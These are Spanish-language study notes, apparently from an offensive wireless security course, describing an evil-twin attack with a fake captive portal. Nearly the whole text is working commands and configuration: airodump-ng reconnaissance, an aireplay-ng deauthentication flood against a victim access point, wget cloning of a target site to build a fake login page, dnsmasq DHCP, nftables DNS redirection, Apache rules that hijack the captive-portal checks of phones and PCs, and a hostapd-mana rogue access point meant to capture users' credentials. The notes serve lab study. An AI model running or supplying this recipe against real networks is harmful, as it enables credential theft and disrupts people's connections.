# Ejercicio

Configure un portal cautivo para su hogar u oficina (con la aprobación de su supervisor y del departamento de TI). Pruebe con una red abierta y una red abierta (OWE), y si tiene una tarjeta inalámbrica independiente, realice una captura de paquetes y examine la diferencia entre una red abierta y una OWE.

Si ningún cliente se conecta, utilice uno de sus propios dispositivos para conectarse.

## Flow en apuntes

Usamos wlan0 como interfaz atacante en modo monitor y wlan2 como interfaz AP no autorizado.

1. Primero, necesitamos conocer el punto de acceso objetivo: 
* Canal 
* Cifrado 
* Clientes , , también deberíamos capturar un 
* protocolo de enlace. (si la red es WPA-PSK o WPA2-PSK, no es absolutamente necesario)

2. Segundo 
* Necesitamos preparar un portal cautivo. 

3. Finalmente 
* configuraremos 
* crearemos nuestro punto de acceso no autorizado 
* ejecutaremos las herramientas necesarias para ayudar a los clientes a descubrir el portal cautivo o intentar forzar su conexión, lo que debería permitirnos capturar las credenciales de usuario.

### Descubrimiento

```bash
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```
#### Obtenemos protocolo de enlace

```bash
sudo aireplay-ng -0 0 -a <BSSID-VICTIMA> wlan0mon
```
### Creacion del sitio

#### 1. Clonamos assets y colocamos en _/var/www/html/Portal_

```bash
wget -r -l2 https://www.megacorpone.com
```

```bash
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/Portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/Portal/
```

#### 2. Creamos index.php y login_check.php en _/var/www/html/Portal_
> Ver archvos en _/var/www/html/Portal_

#### 3. Configuramos la red

1) Asignaremos una dirección IP a nuestra interfaz wlan2(AP)

```bash
sudo ip link set wlan2 down
sudo ip addr add 192.168.87.1/24 dev wlan2
# Verificar
ip -4 addr show dev wlan2
ip route show
# Volver a levantar la interface
sudo ip link set wlan2 up
```

2) Configuramos DHCP

* Creamos archivo mco-dnsmasq.conf

* Ejecutamos

```bash
sudo dnsmasq --conf-file=mco-dnsmasq.conf
```
3) Forzar la redirección de todas las solicitudes DNS a nuestro servidor:
> Con sudo
```bash
nft add table ip nat
nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
En la configuración del sitio de Apache, necesitamos agregar las reglas mod_rewrite7 y mod_alias7:1

```bash
 # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/Portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/Portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/Portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/Portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/Portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/Portal/index.php [L]
```

> Estas adiciones requieren la habilitación de dos módulos. Para las primeras cuatro y las últimas tres instrucciones, necesitamos el módulo de redirección. Para las dos adiciones intermedias "RedirectMatch", necesitamos el módulo de alias.

```bash
sudo a2enmod rewrite alias
```

> **Importatne** agregar caso especial para chrome

### Configuracion y ejecucion del AP no autorizado

Usamos hostapd-mana

1. Creamos archivo mco-hostapd.conf

2. Ejecutamos

```bash
sudo hostapd -B mco-hostapd.conf
```
3. Forzamos deautenitcando al usuario el ESSID victima a conectarse a nuestro AP no autorizado(OPEN)


